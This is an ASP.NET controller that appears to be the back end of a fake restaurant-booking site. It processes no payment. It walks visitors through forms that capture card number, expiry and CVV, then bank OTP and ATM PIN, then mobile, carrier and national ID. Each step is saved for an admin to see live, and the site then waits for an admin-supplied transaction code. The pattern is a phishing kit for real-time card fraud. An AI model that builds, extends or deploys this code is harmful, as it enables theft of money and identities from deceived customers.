using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using BujairiTic.Models;
using static BujairiTic.Models.Enums;

public class BookingController : Controller
{
    private readonly AppDbContext _context;

    public BookingController(AppDbContext context)
    {
        _context = context;
    }

    // ======================================================
    // 1️⃣ CREATE ORDER + ORDER ITEM
    // ======================================================
    [HttpPost]
    public IActionResult Create(
        int restaurantId,
        DateTime BookingDate,
        int Guests,
        string SelectedTime)
    {
        var restaurant = _context.Restaurants
                                 .FirstOrDefault(r => r.Id == restaurantId);

        if (restaurant == null)
            return NotFound();

        if (string.IsNullOrEmpty(SelectedTime))
            return RedirectToAction("Details", "Restaurants", new { id = restaurantId });

        var order = new Order
        {
            FakeUserKey = Guid.NewGuid().ToString(),

            // ✅ أهم سطر — يظهر فوراً عند الأدمن
            Status = OrderStatus.PendingAdmin
        };

        var item = new OrderItem
        {
            RestaurantId = restaurant.Id,
            Title = restaurant.Name,
            BookingDate = BookingDate,
            Guests = Guests,
            SelectedTime = SelectedTime,
            UnitPrice = restaurant.MinimumCharge,
            LineTotal = restaurant.MinimumCharge * Guests
        };

        order.Items.Add(item);

        _context.Orders.Add(order);
        _context.SaveChanges(); // 🔥 يظهر عند الأدمن مباشرة

        return RedirectToAction("Checkout", new { id = order.Id });
    }

    // ======================================================
    // 2️⃣ CHECKOUT
    // ======================================================
    public IActionResult Checkout(int id)
    {
        var order = _context.Orders
                            .Include(o => o.Items)
                            .FirstOrDefault(o => o.Id == id);

        if (order == null)
            return NotFound();

        return View(order);
    }

    [HttpPost]
    public IActionResult SavePaymentMethod(int id, string method)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.PaymentMethod = method;

        _context.SaveChanges(); // 🔥 Live

        return RedirectToAction("PaymentInfo", new { id });
    }

    // ======================================================
    // 3️⃣ CARD INFO
    // ======================================================
    public IActionResult PaymentInfo(int id)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        return View(order);
    }

    [HttpPost]
    public IActionResult SaveCard(int id, Order model)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.CardholderName = model.CardholderName;
        order.CardNumber = model.CardNumber;
        order.Expiry = model.Expiry;
        order.CVV = model.CVV;

        _context.SaveChanges(); // 🔥 Live

        return RedirectToAction("Otp", new { id });
    }

    // ======================================================
    // 4️⃣ OTP + ATM
    // ======================================================
    public IActionResult Otp(int id)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        return View(order);
    }

    [HttpPost]
    public IActionResult SaveOtp(int id, Order model)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        order.Otp = model.Otp;
        order.AtmPassword = model.AtmPassword;

        _context.SaveChanges(); // 🔥 Live

        return RedirectToAction("CustomerInfo", new { id });
    }

    // ======================================================
    // 5️⃣ CUSTOMER INFO
    // ======================================================
    public IActionResult CustomerInfo(int id)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        return View(order);
    }

    [HttpPost]
    public IActionResult SaveCustomerInfo(int id, Order model)
    {
        var order = _context.Orders.Find(id);

        if (order == null)
            return NotFound();

        if (!System.Text.RegularExpressions.Regex.IsMatch(
            model.Mobile ?? "",
            @"^(0\d{9}|5\d{8})$"))
        {
            ModelState.AddModelError("Mobile", "رقم الجوال غير صحيح");

            order.Mobile = model.Mobile;
            order.Provider = model.Provider;
            order.NationalIdOrIqama = model.NationalIdOrIqama;

            return View("CustomerInfo", order);
        }

        order.Mobile = model.Mobile;
        order.Provider = model.Provider;
        order.NationalIdOrIqama = model.NationalIdOrIqama;

        _context.SaveChanges(); // 🔥 Live

        return RedirectToAction("Success", new { id });
    }

    // ======================================================
    // 6️⃣ SUCCESS (WAIT ADMIN CODE)
    // ======================================================
    public IActionResult Success(int id)
    {
        var order = _context.Orders
                            .Include(o => o.Items)
                            .FirstOrDefault(o => o.Id == id);

        if (order == null)
            return NotFound();

        return View(order);
    }

    // ======================================================
    // AJAX — GET TRANSACTION CODE LIVE
    // ======================================================
    [HttpGet]
    public IActionResult GetTransactionCode(int orderId)
    {
        var order = _context.Orders.Find(orderId);

        if (order == null)
            return Json(new { transactionNo = "" });

        return Json(new { transactionNo = order.TransactionNo ?? "" });
    }
}
